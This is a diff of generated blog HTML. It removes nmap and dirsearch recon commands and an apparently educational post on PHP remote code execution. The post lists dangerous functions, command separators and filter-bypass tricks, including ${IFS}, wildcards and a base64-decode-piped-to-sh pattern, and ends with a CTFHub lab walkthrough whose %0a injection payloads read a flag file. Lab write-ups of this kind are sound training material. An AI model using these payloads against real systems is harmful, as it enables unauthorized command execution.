-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见 Web 端口</span></span><br><span class="line">nmap -sV -sC -Pn -iL live_ips.txt -p 80,443,8080,8443,8000,9000,9443 -oA nmap_web</span><br><span class="line"><span class="comment"># 全端口精细扫描，速度较慢</span></span><br><span class="line">nmap -sV -sC -Pn -p- --min-rate 1000 -iL live_ips.txt -oA nmap_full</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="1-8-Web信息收集"><a href="#1-8-Web信息收集" class="headerlink" title="1.8 Web信息收集"></a>1.8 Web信息收集</h3><p>目录信息收集:</p>
-<p>dirsearch工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u https://target.com -e *</span><br></pre></td></tr></table></figure>
-
-<p>浏览器插件FindSomething</p>
-<hr>
 
       
     </div>
@@ -2551,292 +2692,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/10/web-security/rce/2026-08-10-rce/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/private/icon1.png">
-      <meta itemprop="name" content="Byron">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Byron">
-      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Byron">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/08/10/web-security/rce/2026-08-10-rce/" class="post-title-link" itemprop="url">RCE</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-08-10 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-10T22:00:00+08:00">2026-08-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-08-11 16:00:13" itemprop="dateModified" datetime="2026-08-11T16:00:13+08:00">2026-08-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/rce/" itemprop="url" rel="index"><span itemprop="name">rce</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Environment: PHP 7.3.4 + Apache + MySQL 5.7.26</p>
-</blockquote>
-<blockquote>
-<p>Lab: Pikachu DVWA CTFHub</p>
-</blockquote>
-<h1 id="1-0-RCE"><a href="#1-0-RCE" class="headerlink" title="1.0 RCE"></a>1.0 RCE</h1><h2 id="1-1-基础"><a href="#1-1-基础" class="headerlink" title="1.1 基础"></a>1.1 基础</h2><ul>
-<li><strong>定义:</strong> <strong>RCE(Remote Code Execution 远程代码执行)</strong> 是指攻击者能够在目标服务器上<strong>远程执行任意代码或系统命令</strong>的漏洞. 它是 Web 安全中危害等级最高的漏洞类型之一, 一旦利用成功, 攻击者可直接获取服务器权限(GetShell), 进而窃取数据, 植入后门, 横向渗透甚至控制整个内网</li>
-<li><strong>核心原理:</strong> 用户可控的数据, 未经充分过滤&#x2F;转义, 被拼接进了代码或命令的执行上下文中</li>
-</ul>
-<h2 id="1-2-相关函数"><a href="#1-2-相关函数" class="headerlink" title="1.2 相关函数"></a>1.2 相关函数</h2><ul>
-<li>命令command注入</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>函数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>system()</td>
-<td>执行外部程序并显示</td>
-</tr>
-<tr>
-<td>exec() <br>shell_exec()</td>
-<td>通过shell环境执行命令, 并将完整的输出以字符串方式返回</td>
-</tr>
-<tr>
-<td>pcntl_exec()</td>
-<td>在当前进程空间执行指定程序</td>
-</tr>
-<tr>
-<td>passthru()</td>
-<td>执行外部程序并显示原始输出</td>
-</tr>
-<tr>
-<td>popen()</td>
-<td>打开进程文件指针</td>
-</tr>
-<tr>
-<td>proc_open()</td>
-<td>执行一个命令, 并打开用来input&#x2F;output的文件指针</td>
-</tr>
-</tbody></table>
-<ul>
-<li>代码code注入</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>函数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>eval()</td>
-<td>把字符串code作为php代码执行</td>
-</tr>
-<tr>
-<td>assert</td>
-<td>检查一个断言是否为false</td>
-</tr>
-<tr>
-<td>preg replace()</td>
-<td>执行一个正则表达式的搜索和替换</td>
-</tr>
-<tr>
-<td>create function()</td>
-<td>创建一个匿名函数并且返回函数名创</td>
-</tr>
-<tr>
-<td>call userfunc()<br>caIl_user func array()</td>
-<td>把第一个参数作为回调函数调用</td>
-</tr>
-<tr>
-<td>usort()<br>uasort()</td>
-<td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</td>
-</tr>
-</tbody></table>
-<ul>
-<li>Windows命令拼接符号</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>符号</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&amp;&amp;</td>
-<td>左边执行成功, 才执行右边</td>
-</tr>
-<tr>
-<td>&amp;</td>
-<td>拼接</td>
-</tr>
-<tr>
-<td>|</td>
-<td>管道符(前一条输出当后一条输入)</td>
-</tr>
-<tr>
-<td>||</td>
-<td>左边执行失败, 才执行右边</td>
-</tr>
-<tr>
-<td>%0a</td>
-<td>URL 编码的换行, 也能分隔命令</td>
-</tr>
-</tbody></table>
-<ul>
-<li>Linux命令拼接符号</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>符号</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>;</td>
-<td>连接符</td>
-</tr>
-<tr>
-<td>&amp;&amp;</td>
-<td>左边执行成功, 才执行右边</td>
-</tr>
-<tr>
-<td>|</td>
-<td>管道(前一条输出当后一条输入)</td>
-</tr>
-<tr>
-<td>||</td>
-<td>左边执行失败, 才执行右边</td>
-</tr>
-<tr>
-<td>&amp;</td>
-<td>任务后台执行, 类似nohup</td>
-</tr>
-<tr>
-<td>%0a</td>
-<td>URL 编码的换行, 也能分隔命令</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="1-3-过滤绕过"><a href="#1-3-过滤绕过" class="headerlink" title="1.3 过滤绕过"></a>1.3 过滤绕过</h2><ul>
-<li><p><code>空格</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag  <span class="comment"># $&#123;IFS&#125; 是内部字段分隔符(默认含空格/Tab/换行)</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,/flag&#125;     <span class="comment"># 花括号扩展，逗号代替空格</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>cat</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t /flag             <span class="comment"># 空字符串拼接, ca&#x27;&#x27;t 还是 cat</span></span><br><span class="line">ca\t /flag              <span class="comment"># 反斜杠转义</span></span><br><span class="line">c?a? /f???              <span class="comment"># ? 匹配单字符, * 匹配任意 → c?t /f*</span></span><br><span class="line">more/less/head/tail/nl</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>flag</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /f*                 <span class="comment"># * 通配</span></span><br><span class="line"><span class="built_in">cat</span> /fla?               <span class="comment"># ? 通配</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>; | &amp;</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acat /flag   <span class="comment"># URL [换行]编码换行符 %0a 代替 ;</span></span><br><span class="line">127.0.0.1%0dcat /flag   <span class="comment"># %0d [回车]</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Base64编码</p>
-</li>
-</ul>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;cat flag&quot;</span> | <span class="built_in">base64</span>  <span class="comment"># -n必须加否则会自带 \n换行, 实际解码内容溢出</span></span><br><span class="line"><span class="comment"># 此时输出一个编码  </span></span><br><span class="line"><span class="built_in">echo</span> 编码 | <span class="built_in">base64</span> -d | sh    <span class="comment"># 解码并执行 </span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="2-0-实战"><a href="#2-0-实战" class="headerlink" title="2.0 实战"></a>2.0 实战</h2><blockquote>
-<p>CTFHub-RCE(综合过滤)</p>
-</blockquote>
-<ul>
-<li>源码分析</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>后端做校验对”\|&amp;;&#x2F; cat flag ctfhub”等关键字都做了过滤</li>
-<li>这里使用等价替换的方式进行绕过</li>
-</ul>
-<p><strong>01 探测当前目录结构</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/1.png"></p>
-<blockquote>
-<p>回显目标目录flag_is_here</p>
-</blockquote>
-<p><strong>02 查看目标目录结构</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als<span class="variable">$&#123;IFS&#125;</span>f*_is_here</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/2.png"></p>
-<blockquote>
-<p>该文件存放通关代码, 想办法读取</p>
-</blockquote>
-<p><strong>03 获取文件内容</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd<span class="variable">$&#123;IFS&#125;</span>f*_is_here%0aless<span class="variable">$&#123;IFS&#125;</span>f*_10040951432284.php</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/3.png"></p>
-<blockquote>
-<p>打开网页源代码即可获取到通关代码, 输入即可通关本关</p>
-</blockquote>
 
       
     </div>
